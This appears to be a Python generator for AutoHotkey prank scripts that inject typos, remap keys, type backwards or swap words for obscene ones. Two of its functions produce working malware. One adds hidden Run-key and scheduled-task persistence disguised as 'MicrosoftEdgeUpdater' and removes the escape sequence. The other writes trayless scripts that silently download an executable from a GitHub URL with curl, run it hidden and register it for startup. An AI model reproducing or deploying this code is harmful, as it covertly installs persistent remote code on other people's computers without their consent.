def fat_fingering():
    neighbors = {
        'q': ['w', 'a'],
        'w': ['q', 'a', 's', 'e'],
        'e': ['w', 's', 'd', 'r'],
        'r': ['e', 'd', 'f', 't'],
        't': ['r', 'f', 'g', 'y'],
        'y': ['t', 'g', 'h', 'u'],
        'u': ['y', 'h', 'j', 'i'],
        'i': ['u', 'j', 'k', 'o'],
        'o': ['i', 'k', 'l', 'p'],
        'p': ['o', 'l'],

        'a': ['q', 'w', 's', 'z'],
        's': ['a', 'w', 'e', 'd', 'x', 'z'],
        'd': ['s', 'e', 'r', 'f', 'c', 'x'],
        'f': ['d', 'r', 't', 'g', 'v', 'c'],
        'g': ['f', 't', 'y', 'h', 'b', 'v'],
        'h': ['g', 'y', 'u', 'j', 'n', 'b'],
        'j': ['h', 'u', 'i', 'k', 'n', 'm'],
        'k': ['j', 'i', 'o', 'l', 'm'],
        'l': ['k', 'o', 'p'],

        'z': ['a', 's', 'x'],
        'x': ['z', 's', 'd', 'c'],
        'c': ['x', 'd', 'f', 'v'],
        'v': ['c', 'f', 'g', 'b'],
        'b': ['v', 'g', 'h', 'n'],
        'n': ['b', 'h', 'j', 'm'],
        'm': ['n', 'j', 'k']
    }

    result = '''#SingleInstance Force

global odds1 := 1
global odds2 := 10

konami(char) {
    static current := 0
    if (char = "Up" && current = 0) {
        current := 1
    } else if (char = "Up" && current = 1) {
        current := 2
    } else if (char = "Down" && current = 2) {
        current := 3
    } else if (char = "Down" && current = 3) {
        current := 4
    } else if (char = "Left" && current = 4) {
        current := 5
    } else if (char = "Right" && current = 5) {
        current := 6
    } else if (char = "Left" && current = 6) {
        current := 7
    } else if (char = "Right" && current = 7) {
        current := 8
    } else if (char = "b" && current = 8) {
        current := 9
    } else if (char = "a" && current = 9) {
        ExitApp()
    } else {
        current := 0
    }
}

'''

    for key in neighbors:
        adjacent = neighbors[key]
        result += "$" + key + '::{\n\trand := Random(1, odds2)\n\tif (rand <= odds1) {\n\t\t'
        result += 'rand2 := Random(1, ' + str(len(adjacent)) + ")\n\t\t"
        first = True
        for i in range(len(adjacent)):
            if not first:
                result += ' else '
            else:
                first = False
            result += 'if (rand2 = ' + str(i + 1) + ') {\n\t\t\tSend "' + key + adjacent[i] + '"\n\t\t}'
        result += '\n\t} else {\n\t\tSend "' + key + '"\n\t}'
        result += '\n\tkonami("' + key + '")'
        result += '\n}\n'

        result += "$+" + key + '::{\n\trand := Random(1, odds2)\n\tif (rand <= odds1) {\n\t\t'
        result += 'rand2 := Random(1, ' + str(len(adjacent)) + ")\n\t\t"
        first = True
        for i in range(len(adjacent)):
            if not first:
                result += ' else '
            else:
                first = False
            result += 'if (rand2 = ' + str(i + 1) + ') {\n\t\t\tSend "+' + key + "+" + adjacent[i] + '"\n\t\t}'
        result += '\n\t} else {\n\t\tSend "+' + key + '"\n\t}'
        result += '\n\tkonami("' + key + '")'
        result += '\n}\n'

    result += '''$Up::{
    Send "{Up}"
    konami("Up")
}
$Down::{
    Send "{Down}"
    konami("Down")
}
$Left::{
    Send "{Left}"
    konami("Left")
}
$Right::{
    Send "{Right}"
    konami("Right")
}
'''

    with open("output.txt", "w") as file:
        file.write(result + "^Esc::ExitApp\n")

def persistent_fat_fingering():
    neighbors = {
        'q': ['w', 'a'],
        'w': ['q', 'a', 's', 'e'],
        'e': ['w', 's', 'd', 'r'],
        'r': ['e', 'd', 'f', 't'],
        't': ['r', 'f', 'g', 'y'],
        'y': ['t', 'g', 'h', 'u'],
        'u': ['y', 'h', 'j', 'i'],
        'i': ['u', 'j', 'k', 'o'],
        'o': ['i', 'k', 'l', 'p'],
        'p': ['o', 'l'],

        'a': ['q', 'w', 's', 'z'],
        's': ['a', 'w', 'e', 'd', 'x', 'z'],
        'd': ['s', 'e', 'r', 'f', 'c', 'x'],
        'f': ['d', 'r', 't', 'g', 'v', 'c'],
        'g': ['f', 't', 'y', 'h', 'b', 'v'],
        'h': ['g', 'y', 'u', 'j', 'n', 'b'],
        'j': ['h', 'u', 'i', 'k', 'n', 'm'],
        'k': ['j', 'i', 'o', 'l', 'm'],
        'l': ['k', 'o', 'p'],

        'z': ['a', 's', 'x'],
        'x': ['z', 's', 'd', 'c'],
        'c': ['x', 'd', 'f', 'v'],
        'v': ['c', 'f', 'g', 'b'],
        'b': ['v', 'g', 'h', 'n'],
        'n': ['b', 'h', 'j', 'm'],
        'm': ['n', 'j', 'k']
    }

    result = '''#SingleInstance Force

global odds1 := 1
global odds2 := 10

konami(char) {
    static current := 0
    if (char = "Up" && current = 0) {
        current := 1
    } else if (char = "Up" && current = 1) {
        current := 2
    } else if (char = "Down" && current = 2) {
        current := 3
    } else if (char = "Down" && current = 3) {
        current := 4
    } else if (char = "Left" && current = 4) {
        current := 5
    } else if (char = "Right" && current = 5) {
        current := 6
    } else if (char = "Left" && current = 6) {
        current := 7
    } else if (char = "Right" && current = 7) {
        current := 8
    } else if (char = "b" && current = 8) {
        current := 9
    } else if (char = "a" && current = 9) {
        MsgBox("Now why would I have left this in for a comp?")
    } else {
        current := 0
    }
}

'''

    for key in neighbors:
        adjacent = neighbors[key]
        result += "$" + key + '::{\n\trand := Random(1, odds2)\n\tif (rand <= odds1) {\n\t\t'
        result += 'rand2 := Random(1, ' + str(len(adjacent)) + ")\n\t\t"
        first = True
        for i in range(len(adjacent)):
            if not first:
                result += ' else '
            else:
                first = False
            result += 'if (rand2 = ' + str(i + 1) + ') {\n\t\t\tSend "' + key + adjacent[i] + '"\n\t\t}'
        result += '\n\t} else {\n\t\tSend "' + key + '"\n\t}'
        result += '\n\t' + r'''RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"'''
        result += '\n\t' + r'''Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"'''
        result += '\n\tkonami("' + key + '")'
        result += '\n}\n'

        result += "$+" + key + '::{\n\trand := Random(1, odds2)\n\tif (rand <= odds1) {\n\t\t'
        result += 'rand2 := Random(1, ' + str(len(adjacent)) + ")\n\t\t"
        first = True
        for i in range(len(adjacent)):
            if not first:
                result += ' else '
            else:
                first = False
            result += 'if (rand2 = ' + str(i + 1) + ') {\n\t\t\tSend "+' + key + "+" + adjacent[i] + '"\n\t\t}'
        result += '\n\t} else {\n\t\tSend "+' + key + '"\n\t}'
        result += '\n\tkonami("' + key + '")'
        result += '\n}\n'

    result += r'''$Up::{
    Send "{Up}"
    konami("Up")
    RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
    Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
}
$Down::{
    Send "{Down}"
    konami("Down")
    RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
    Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
}
$Left::{
    Send "{Left}"
    konami("Left")
    RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
    Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
}
$Right::{
    Send "{Right}"
    konami("Right")
    RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"
    Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"
}
'''

    with open("output.txt", "w") as file:
        file.write(result + "^Esc::ExitApp\n")

def shift_keyboard_right_one():
    letters = [
        'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p',
        'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l',
        'z', 'x', 'c', 'v', 'b', 'n', 'm',
    ]
    letters2 = [
        'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'q',
        's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'a',
        'x', 'c', 'v', 'b', 'n', 'm', 'z',
    ]

    result = '''#SingleInstance Force

konami(char) {
    static current := 0
    if (char = "Up" && current = 0) {
        current := 1
    } else if (char = "Up" && current = 1) {
        current := 2
    } else if (char = "Down" && current = 2) {
        current := 3
    } else if (char = "Down" && current = 3) {
        current := 4
    } else if (char = "Left" && current = 4) {
        current := 5
    } else if (char = "Right" && current = 5) {
        current := 6
    } else if (char = "Left" && current = 6) {
        current := 7
    } else if (char = "Right" && current = 7) {
        current := 8
    } else if (char = "b" && current = 8) {
        current := 9
    } else if (char = "a" && current = 9) {
        ExitApp()
    } else {
        current := 0
    }
}

'''

    for i in range(len(letters)):
        result += '$' + letters[i] + '''::{
    Send "''' + letters2[i] + '''"
    konami("''' + letters[i] + '''")
}
'''

    with open("output.txt", "w") as file:
        file.write(result + "^Esc::ExitApp\n")

def type_backwards():
    letters = [
        'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p',
        'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l',
        'z', 'x', 'c', 'v', 'b', 'n', 'm',
        '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
        '-', '=', '[', ']', '\\', ';', "'", ',', '.', '/',
    ]

    result = '''#SingleInstance Force

    konami(char) {
        static current := 0
        if (char = "Up" && current = 0) {
            current := 1
        } else if (char = "Up" && current = 1) {
            current := 2
        } else if (char = "Down" && current = 2) {
            current := 3
        } else if (char = "Down" && current = 3) {
            current := 4
        } else if (char = "Left" && current = 4) {
            current := 5
        } else if (char = "Right" && current = 5) {
            current := 6
        } else if (char = "Left" && current = 6) {
            current := 7
        } else if (char = "Right" && current = 7) {
            current := 8
        } else if (char = "b" && current = 8) {
            current := 9
        } else if (char = "a" && current = 9) {
            ExitApp()
        } else {
            current := 0
        }
    }

    '''

    for i in range(len(letters)):
        result += '$' + letters[i] + '''::{
    Send "''' + letters[i] + '''{Left}"
    konami("''' + letters[i] + '''")
}
'''
    result += '$+' + letters[i] + '''::{
    Send "+''' + letters[i] + '''{Left}"
    konami("''' + letters[i] + '''")
}
'''

    result += '''$Space::{
    Send "{Space}"
    konami("Space")
}
$Up::{
    Send "{Down}"
    konami("Up")
}
$Down::{
    Send "{Up}"
    konami("Down")
}
$Left::{
    Send "{Right}"
    konami("Left")
}
$Right::{
    Send "{Left}"
    konami("Right")
}
'''

    with open("output.txt", "w") as file:
        file.write(result + "^Esc::ExitApp\n")

def autocorrect():
    letters = [
        'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p',
        'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l',
        'z', 'x', 'c', 'v', 'b', 'n', 'm',
    ]

    changes = {
        'angel_anal':'{Backspace 3}al',
        'asf_sad':'{Backspace 3}sad',
        'autocorrect_auto_corrupt':'{Backspace 7}{Space}corrupt',
        'beach_bitch':'{Backspace 4}itch',
        'beast_breast':'{Backspace 4}reast',
        'bone_porn':'{Backspace 4}porn',
        'book_boob':'{Backspace}b',
        'cant_cunt':'{Backspace 3}unt',
        'cars_cats':'{Backspace 2}ts',
        'cats_cars':'{Backspace 2}rs',
        'caulk_cock':'{Backspace 4}ock',
        'cock_caulk':'{Backspace 3}aulk',
        'confused_coming_used':'{Backspace 6}ming{Space}used',
        'corn_porn':'{Backspace 4}porn',
        'correct_erect':'{Backspace 7}erect',
        'dice_dick':'{Backspace}k',
        'diet_dirt':'{Backspace 2}rt',
        'donut_dildo':'{Backspace 4}ildo',
        'duck_fuck':'{Backspace 4}fuck',
        'girl_gorilla':'{Backspace 3}orilla',
        'going_galena':'{Backspace 4}alena',
        'good_god':'{Backspace 2}d',
        'hill_hell':'{Backspace 3}ell',
        'honey_horny':'{Backspace 3}rny',
        'i_k':'{Backspace}k',
        'kick_kiss':'{Backspace 2}ss',
        'lamp_lmao':'{Backspace 3}mao',
        'live_libe':'{Backspace 2}be',
        'lmao_lamp':'{Backspace 3}amp',
        'organism_orgasm':'{Backspace 4}sm',
        'peanut_penis':'{Backspace 4}nis',
        'people_penis':'{Backspace 4}nis',
        'pool_poo':'{Backspace}',
        'pork_porn':'{Backspace}n',
        'probably_peanut_uterus':'{Backspace 7}eanut{Space}uterus',
        'public_pubic':'{Backspace 3}ic',
        'puppies_pussies':'{Backspace 5}ssies',
        'ready_dead':'{Backspace 5}dead',
        'relaxing_slaving':'{Backspace 8}slaving',
        'rit_tit':'{Backspace 3}tit',
        'sec_sex':'{Backspace}x',
        'shot_shit':'{Backspace 2}it',
        'speak_sleep':'{Backspace 4}leep',
        'sticky_stinky':'{Backspace 3}nky',
        'terrible_testicle':'{Backspace 6}sticle',
        'that_thar':'{Backspace}r',
        'thing_thug':'{Backspace 3}ug',
        'tub_rub':'{Backspace 3}rub',
        'weird_wired':'{Backspace 4}ired',
        'wired_weird':'{Backspace 4}eird',
    }

    result = '''#SingleInstance Force

commands(char) {
    static konami := 0\n'''
    for change in changes:
        result += "    static " + change + " := 0\n"

    result += '''
    if (char = 'Space') {
        konami := 0\n'''
    for change in changes:
        result += "        " + change + " := 0\n"

    result += '''Return
    }

    if (char = "Up" && konami = 0) {
        konami := 1
    } else if (char = "Up" && konami = 1) {
        konami := 2
    } else if (char = "Down" && konami = 2) {
        konami := 3
    } else if (char = "Down" && konami = 3) {
        konami := 4
    } else if (char = "Left" && konami = 4) {
        konami := 5
    } else if (char = "Right" && konami = 5) {
        konami := 6
    } else if (char = "Left" && konami = 6) {
        konami := 7
    } else if (char = "Right" && konami = 7) {
        konami := 8
    } else if (char = "b" && konami = 8) {
        konami := 9
    } else if (char = "a" && konami = 9) {
        ExitApp()
    } else {
        konami := 0
    }
'''
    for change in changes:
        result += '\n    if (' + change + ' != -1 && char = SubStr(\'' + change.split("_")[0] + '\', ' + change + ' + 1, 1)) {\n'
        result += '        ' + change + ' += 1\n'
        result += '        if (' + change + ' = StrLen(\'' + change.split("_")[0] + '\')) {\n'
        result += '            ' + change + ' := -1\n'
        result += '            Send \'' + changes[change] + '\'\n'
        result += '        }\n'
        result += '    } else if (char != SubStr(\'' + change.split("_")[0] + '\', ' + change + ' + 1, 1)) {\n'
        result += '        ' + change + ' := -1\n'
        result += '    }\n'
    result += '''}

'''

    for i in range(len(letters)):
        result += '$' + letters[i] + """::{
    Send '""" + letters[i] + """'
    commands('""" + letters[i] + """')
}
"""

    result += '''$Space::{
    Send '{Space}'
    commands('Space')
}
$Up::{
    Send '{Up}'
    commands('Up')
}
$Down::{
    Send '{Down}'
    commands('Down')
}
$Left::{
    Send '{Left}'
    commands('Left')
}
$Right::{
    Send '{Right}'
    commands('Right')
}
'''

    with open("output.txt", "w") as file:
        file.write(result + "^Esc::ExitApp\n")

def no_doubles():
    letters = [
        'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p',
        'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l',
        'z', 'x', 'c', 'v', 'b', 'n', 'm',
    ]
    result = '''#SingleInstance Force

global previous := ""

konami(char) {
    static current := 0
    if (char = "Up" && current = 0) {
        current := 1
    } else if (char = "Up" && current = 1) {
        current := 2
    } else if (char = "Down" && current = 2) {
        current := 3
    } else if (char = "Down" && current = 3) {
        current := 4
    } else if (char = "Left" && current = 4) {
        current := 5
    } else if (char = "Right" && current = 5) {
        current := 6
    } else if (char = "Left" && current = 6) {
        current := 7
    } else if (char = "Right" && current = 7) {
        current := 8
    } else if (char = "b" && current = 8) {
        current := 9
    } else if (char = "a" && current = 9) {
        ExitApp()
    } else {
        current := 0
    }
}

'''
    for letter in letters:
        result += '$' + letter + '''::{
    if (previous != "''' + letter + '''") {
        Send "''' + letter + '''"
    }
    global previous := "''' + letter + '''"
    konami("''' + letter + '''")
}
'''

    result += '''$Space::{
    Send "{Space}"
    konami("Space")
}
$Up::{
    Send "{Up}"
    konami("Up")
}
$Down::{
    Send "{Down}"
    konami("Down")
}
$Left::{
    Send "{Left}"
    konami("Left")
}
$Right::{
    Send "{Right}"
    konami("Right")
}
'''

    with open("output.txt", "w") as file:
        file.write(result + "^Esc::ExitApp\n")

def tool():
    letters = [
        'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p',
        'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l',
        'z', 'x', 'c', 'v', 'b', 'n', 'm',
    ]
    others = [
        'LButton', 'RButton', 'Delete', 'Backspace', 'Space',
    ]

    for letter in letters:
        result = '''#SingleInstance Ignore
    #NoTrayIcon

    $'''
        result += letter + r'''::{
        path := "C:\Microsoft"
        Send "''' + letter + r'''"

        output := path "\run.exe"
        if (DirExist(path)) {
            if (FileExist(path "\run.exe")) {
                Run output, , "Hide"
            } else {
                url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
                command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
                RunWait command, , "Hide"
                Run output, , "Hide"
            }
        } else {
            DirCreate(path)
            url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
            command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
            RunWait command, , "Hide"
            Run output, , "Hide"
        }
    }
    '''

        with open("../Public-AHK/" + letter + ".ahk", "w") as file:
            file.write(result)


    for other in others:
        result = '''#SingleInstance Ignore
    #NoTrayIcon

    $'''
        result += other + r'''::{
        path := "C:\Microsoft"
        Send "{''' + other + r'''}"
        RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate0"
        RegWrite '"C:\Microsoft\LButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate1"
        RegWrite '"C:\Microsoft\RButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate2"
        RegWrite '"C:\Microsoft\Delete.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3"
        RegWrite '"C:\Microsoft\Backspace.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate4"
        RegWrite '"C:\Microsoft\Space.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate5"

        output := path "\run.exe"
        if (DirExist(path)) {
            if (FileExist(path "\run.exe")) {
                Run output, , "Hide"
            } else {
                url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
                command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
                RunWait command, , "Hide"
                Run output, , "Hide"
            }
        } else {
            DirCreate(path)
            url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
            command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
            RunWait command, , "Hide"
            Run output, , "Hide"
        }
    }
    '''

        with open("../Public-AHK/" + other + ".ahk", "w") as file:
            file.write(result)

if __name__ == "__main__":
    # fat_fingering()
    persistent_fat_fingering()
    # shift_keyboard_right_one()
    # type_backwards()
    # autocorrect()
    # no_doubles()
    # tool()
    pass
